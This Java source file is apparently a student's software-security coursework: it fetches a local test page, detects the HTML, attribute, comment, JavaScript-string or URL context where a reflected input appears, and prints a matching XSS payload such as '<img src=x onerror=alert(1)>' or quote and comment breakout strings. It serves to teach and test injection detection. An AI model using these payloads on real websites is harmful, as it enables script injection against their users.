import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Attribute;
import org.jsoup.nodes.Attributes;
import org.jsoup.nodes.Comment;
import org.jsoup.nodes.DataNode;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.nodes.Node;
import org.jsoup.nodes.TextNode;
import org.jsoup.select.NodeVisitor;

/**
 * @author kvivekanandan Apr 24, 2016 Launcher.java
 */

public class Launcher {
	static String url = "http://localhost:9615/precise_xss/test5.html";
	static String fileName = "/Users/kvivekanandan/Desktop/ASU/CSE_545_Software_Security/server/precise_xss/test5.html";
	static String input = "baz";
	static String payload = "";

	/*
	 * 1 - simple HTML; <h1> 2 - attribute value, 3 cases ;3 - comments 3 cases;
	 * 4 - attribute name ;5 - script, 3 cases ;6 - function call ;7 - js, 4
	 * cases; 9 - urls
	 */
	static enum CONTEXT {
		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE_SINGLE, HTML_ATTRIBUTE_VALUE_DOUBLE, 
		HTML_ATTRIBUTE_VALUE_NO, HTML_ATTRIBUTE_VALUE_EVENT_SINGLE, HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE,
		HTML_ATTRIBUTE_VALUE_EVENT_NO, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, 
		JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
	};

	//TODO javascript sinks and css contexts 
	
	static String urlAttributes = "";
	static CONTEXT context = null;

	public static void main(String[] args) {
		try {
			Document doc = Jsoup.connect(url).get();
			doc.traverse(new NodeVisitor() {
				@Override
				public void head(Node node, int arg1) {
					context = null;
					if (node instanceof TextNode) {
						TextNode tn = (TextNode) node;
						if (!tn.isBlank()) {
							String text = tn.text();
							if (text.contains(input)) {
								System.out.println("TEXT NODE contains input: " + text);
								context = CONTEXT.SIMPLE_HTML;
							}
						}
					}
					if (node instanceof DataNode) {
						DataNode dn = (DataNode) node;
						String data = dn.getWholeData();
						if (data != null && data.contains(input)) {
							System.out.println("DATA NODE contains input: " + data);
							String func = "(" + input + ")";
							String singleQuotes = "'" + input + "'";
							String doubleQuotes = "\"" + input + "\"";
							String singleLineComment = "//.*" + input + ".*\r\n";
							String doubleLineComment = "\\/\\*.*" + input + ".*\\*\\/";

							Pattern pFunc = Pattern.compile(func);
							Pattern pSingleQuotes = Pattern.compile(singleQuotes);
							Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
							Pattern pSingleLineComment = Pattern.compile(singleLineComment);
							Pattern pDoubleLineComment = Pattern.compile(doubleLineComment, Pattern.DOTALL);

							Matcher m = pFunc.matcher(data);
							if (m.find()) {
								System.out.println("func pattern");
								context = CONTEXT.JS_FUNC;
							}
							
							m = pSingleQuotes.matcher(data);
							if (m.find()) {
								System.out.println("single quotes pattern");
								context = CONTEXT.JS_SINGLE_QUOTES;
							}
							
							m = pDoubleQuotes.matcher(data);
							if (m.find()) {
								System.out.println("double quotes pattern");
								context = CONTEXT.JS_DOUBLE_QUOTES;
							}
				
							m = pSingleLineComment.matcher(data);
							if (m.find()) {
								System.out.println("single line comment pattern");
								context = CONTEXT.JS_SINGLE_COMMENT;
							}
				
							m = pDoubleLineComment.matcher(data);
							if (m.find()) {
								System.out.println("multi line comment pattern");
								context = CONTEXT.JS_MULTI_COMMENT;
							}
						}
					}
					if (node instanceof Element) {
						Element e = (Element) node;
						Attributes attributes = e.attributes();
						for (Attribute a : attributes) {
							if (a.getKey() != null && a.getKey().equals(input)) {
								System.out.println("ELEMENT NODENAME:" + e.nodeName());
								System.out.println("attribute name is equal to input");
								context = CONTEXT.HTML_ATTRIBUTE_NAME;
							}
							if (a.getValue() != null && a.getValue().equals(input)) {

								if ((e.nodeName().equals("a") || e.nodeName().equals("base") || e.nodeName().equals("link")) && a.getKey().equals("href")) {
									context = CONTEXT.URLS;
								} else if ((e.nodeName().equals("script") || e.nodeName().equals("iframe") || e.nodeName().equals("frame") || e.nodeName().equals("embed") || e.nodeName().equals("input") || e.nodeName().equals("audio") || e.nodeName().equals("video") || e.nodeName().equals("source"))
										&& a.getKey().equals("src")) {
									context = CONTEXT.URLS;
								} else if ((e.nodeName().equals("object")) && a.getKey().equals("data")) {
									context = CONTEXT.URLS;
								} else if ((e.nodeName().equals("form")) && a.getKey().equals("action")) {
									context = CONTEXT.URLS;
								} else if ((e.nodeName().equals("button") || e.nodeName().equals("input")) && a.getKey().equals("formaction")) {
									context = CONTEXT.URLS;
								}
								if (a.getKey().equals("onclick") || a.getKey().equals("onload")) {
									CONTEXT valueContext = getAttributeValueContext(e.tagName(), a.getKey(), a.getValue(), fileName);
									switch (valueContext) {
									case HTML_ATTRIBUTE_VALUE_DOUBLE:
										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE;
										break;
									case HTML_ATTRIBUTE_VALUE_SINGLE:
										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_SINGLE;
										break;
									case HTML_ATTRIBUTE_VALUE_NO:
										context = CONTEXT.HTML_ATTRIBUTE_VALUE_EVENT_NO;
										break;
									}

								} else {
									System.out.println("ELEMENT NODENAME:" + e.nodeName());
									System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
									context = getAttributeValueContext(e.tagName(), a.getKey(), a.getValue(), fileName);
								}
							}
						}
					}
					if (node instanceof Comment) {
						Comment c = (Comment) node;
						String comment = c.getData();
						if (comment != null && comment.contains(input)) {
							System.out.println("COMMENT NODE: " + comment);
							context = CONTEXT.HTML_COMMENTS;
						}
					}
					if (context != null) {
						switch (context) {
						case SIMPLE_HTML:
							payload = "<img src=x onerror=alert(1)>";
							break;
						case HTML_ATTRIBUTE_NAME:
							payload = "onclick=\"alert(1)\"";
							break;
						case HTML_ATTRIBUTE_VALUE_SINGLE:
							payload = "\' onclick=\'alert(1)";
							break;
						case HTML_ATTRIBUTE_VALUE_DOUBLE:
							payload = "\" onclick=\"alert(1)";
							break;
						case HTML_ATTRIBUTE_VALUE_NO:
							payload = "\"\" onclick=alert(1)";
							break;
						case HTML_ATTRIBUTE_VALUE_EVENT_SINGLE:
							payload = "alert(1)";
							break;
						case HTML_ATTRIBUTE_VALUE_EVENT_DOUBLE:
							payload = "alert(1)";
							break;
						case HTML_ATTRIBUTE_VALUE_EVENT_NO:
							payload = "alert(1)";
							break;
						case JS_FUNC:
							payload = "-</script><img src=x onerror=alert(1)>";
							break;
						case JS_SINGLE_QUOTES:
							payload = "';alert(1);";
							break;
						case JS_DOUBLE_QUOTES:
							payload = "\";alert(2);\"";
							break;
						case JS_SINGLE_COMMENT:
							payload = "\r\nalert(3);";
							break;
						case JS_MULTI_COMMENT:
							payload = "*/alert(1);";
							break;
						case CSS_CONTEXT:
							break;
						case HTML_COMMENTS:
							payload = "--><img src=x onerror=alert(1)>";
							break;
						case URLS:
							payload = "javascript://%0Aalert%28'XSS'%29;";
						default:
							break;

						}
						System.out.println("PAYLOAD: " + payload);
					}
				}

				@Override
				public void tail(Node node, int arg1) {
					// System.out.println("Exiting nodeName: " +
					// node.nodeName());

				}
			});
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	static CONTEXT getAttributeValueContext(String tag, String key, String value, String fileName) {
		CONTEXT context = null;
		String doc = null;
		try {
			doc = new Scanner(new File(fileName)).useDelimiter("\\Z").next();
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}

		Pattern p = Pattern.compile("<" + tag + ".*(\\/> | \\/" + tag + ">|>)");
		Matcher m = p.matcher(doc);
		while (m.find()) {
			String mat = m.group(0);
			if (mat.contains(key) && mat.contains(value)) {
				System.out.println(m.group(0));
				String singleQuotes = "'" + input + "'";
				String doubleQuotes = "\"" + input + "\"";
				Pattern pSingleQuotes = Pattern.compile(singleQuotes);
				Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
				Matcher sm = pSingleQuotes.matcher(mat);
				if (sm.find()) {
					System.out.println("single quotes pattern");
					context = CONTEXT.HTML_ATTRIBUTE_VALUE_SINGLE;
					break;
				}
				Matcher dm = pDoubleQuotes.matcher(mat);
				if (dm.find()) {
					System.out.println("double quotes pattern");
					context = CONTEXT.HTML_ATTRIBUTE_VALUE_DOUBLE;
					break;
				}
				context = CONTEXT.HTML_ATTRIBUTE_VALUE_NO;
			}
		}
		return context;
	}
}
